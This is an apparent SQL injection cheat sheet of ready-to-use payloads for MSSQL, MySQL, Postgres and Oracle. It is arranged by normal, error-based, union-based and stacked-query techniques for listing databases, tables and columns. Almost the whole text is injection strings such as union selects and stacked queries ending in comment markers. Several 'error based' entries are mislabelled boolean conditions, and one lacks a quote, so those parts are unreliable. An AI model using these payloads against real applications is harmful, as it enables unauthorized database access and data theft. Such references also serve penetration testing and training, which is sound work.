# SQLi Cheat sheet


### MSSQL

#### List databases:
- Normal
    - `Select name from sys.databases`
- Error based
    - `cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)`
- Union Based
    - `' UNION SELECT name, NULL FROM master..sysdatabases --`
- Stacked Queries:
    - `; SELECT name FROM master..sysdatabases; --`


#### List Tables:
- Normal
    - `select * from app.information_schema.tables;`
- Error based`
    - `cast((SELECT TABLE_NAME FROM exercise.information_schema.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)`
- Union Based
    - `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --`
- Stacked Queries:
    - `; SELECT * FROM information_schema.tables; --`

#### List columns:
- Normal
    - `select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';`
- Error based
    - `cast((SELECT+column_name+FROM+exercise.information_schema.columns+where+table_name+%3d+'secrets'+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY)+as+integer)`
- Union Based
    - `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 'table_name' --`
- Stacked Queries:
    - `; SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'table_name'; --`

## MYSQL

### List databases:
- Normal
    - `SHOW DATABASES;`
- Error based
    - `' AND (SELECT COUNT(*) FROM information_schema.schemata) -- `
- Union Based
    - `' UNION SELECT schema_name, NULL FROM information_schema.schemata --`
- Stacked Queries:
    - `; SHOW DATABASES; --`

### List Tables:
- Normal
    - `SHOW TABLES;`
- Error based
    - `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'database_name') --`
- Union Based
    - `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --`
- Stacked Queries:
    - `; SHOW TABLES; --`

### List columns:
- Normal
    - `SHOW COLUMNS FROM table_name;`
- Error based
    - `' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'table_name') --`
- Union Based
    - `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
- Stacked Queries:
    - `; SHOW COLUMNS FROM table_name; --`

## Postgres

### List databases:
- Normal
    - `SELECT datname FROM pg_database;`
- Error based
    - `AND (SELECT COUNT(*) FROM pg_database) --`
- Union Based
    - `' UNION SELECT datname, NULL FROM pg_database --`
- Stacked Queries:
    - `; SELECT datname FROM pg_database; --`

### List Tables:
- Normal
    - `SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';`
- Error based
    - `AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public') --`
- Union Based
    - `' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --`
- Stacked Queries:
    - `; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --`

### List columns:
- Normal
    - `SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';`
- Error based
    - `AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'table_name') --`
- Union Based
    - `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
- Stacked Queries:
    - `; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --`

## ORACLE

### List databases:
- Normal
    - `SELECT name FROM v$database;`
- Error based
    - `' AND (SELECT COUNT(*) FROM v$database) --`
- Union Based
    - `' UNION SELECT name, NULL FROM v$database --`
- Stacked Queries:
    - `; SELECT name FROM v$database; --`

### List Tables:
- Normal
    - `SELECT table_name FROM all_tables;`
- Error based
    - `' AND (SELECT COUNT(*) FROM all_tables) --`
- Union Based
    - `' UNION SELECT table_name, NULL FROM all_tables --`
- Stacked Queries:
    - `; SELECT table_name FROM all_tables; --`

### List columns:
- Normal
    - `SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';`
- Error based
    - `' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --`
- Union Based
    - `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --`
- Stacked Queries:
    - `; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --`